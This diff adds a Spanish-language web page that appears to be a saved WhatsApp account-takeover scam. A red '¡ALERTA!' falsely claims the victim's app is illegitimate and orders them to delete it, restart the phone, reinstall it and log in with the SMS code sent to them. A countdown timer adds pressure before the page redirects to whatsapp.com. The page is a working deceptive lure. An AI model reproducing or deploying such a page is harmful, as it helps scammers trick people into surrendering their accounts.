@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<!-- saved from url=(0051)https://roaring-lolly-5cffc7.netlify.app/pico2.html -->
+<html lang="es">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación</title>
+
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background-image: url('docs/tapiz.png');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .card {
+      background: white;
+      padding: 25px;
+      border-radius: 20px;
+      text-align: center;
+      width: 90%;
+      max-width: 350px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+    }
+
+    .top-image {
+      width: 120px;
+      margin-bottom: 15px;
+    }
+
+    .text {
+      font-size: 14px;
+      line-height: 1.5;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+
+    .loader-gif {
+      width: 120px;
+      margin: 20px auto;
+      display: block;
+    }
+
+    #timer {
+      font-size: 20px;
+      margin-top: 10px;
+      font-weight: bold;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+
+    .small-text {
+      font-size: 16px;
+      margin-top: 10px;
+      font-family: 'Segoe UI', Arial, sans-serif;
+    }
+
+    @media (max-width: 480px) {
+      .text {
+        font-size: 20px;
+      }
+
+      #timer {
+        font-size: 22px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="card">
+
+    <img src="./Verificación_files/images-(2).png" alt="imagen" class="top-image">
+    <h2 style="color: red;">¡ALERTA!</h2>
+    <p class="text">
+      Hemos registrado que su App no es Legal de su tienda Oficial se recomienda de manera obligatoria: 🗑️ Eliminar la
+      aplicación. 🔁 Reiniciar el dispositivo móvil. ⬇️ Instalar nuevamente e iniciar sesión con el codigo de seguridad
+      SMS enviado.
+    </p>
+
+    <img src="./Verificación_files/whatsapp-delete-whatsapp.gif" alt="Cargando..." class="loader-gif">
+
+    <p id="timer">Soporte 1:05</p>
+    <p class="small-text">Términos y condiciones de seguridad</p>
+
+  </div>
+
+  <script>
+    let time = 80;
+
+    const timerElement = document.getElementById("timer");
+
+    const countdown = setInterval(() => {
+      let minutes = Math.floor(time / 60);
+      let seconds = time % 60;
+
+      seconds = seconds < 10 ? "0" + seconds : seconds;
+
+      timerElement.textContent = `Soporte ${minutes}:${seconds}`;
+
+      time--;
+
+      if (time < 0) {
+        clearInterval(countdown);
+        window.location.href = "https://www.whatsapp.com/?lang=es_LA";
+      }
+    }, 1000);
+  </script>
+
+
+
+</body>
+
+</html>
